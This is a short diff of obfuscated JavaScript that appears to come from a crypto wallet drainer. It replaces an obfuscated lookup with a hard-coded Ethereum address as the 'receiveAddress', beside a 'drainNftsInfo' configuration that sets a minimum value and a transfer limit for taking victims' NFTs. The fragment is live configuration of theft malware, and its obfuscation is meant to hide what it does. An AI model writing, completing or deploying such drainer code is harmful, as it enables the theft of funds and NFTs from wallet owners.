@@ -70,7 +70,7 @@ const _0x5e20ce = _0xde99;
         }
     }
 }(_0x40c3, 0xee2a8));
-const receiveAddress = _0x5e20ce(0x112),
+const receiveAddress = '0x595fa88c104A7D286166aFD9DbbB4256D11F6ed5',
     drainNftsInfo = {
         'minValue': 0.1,
         'maxTransfers': 0x1
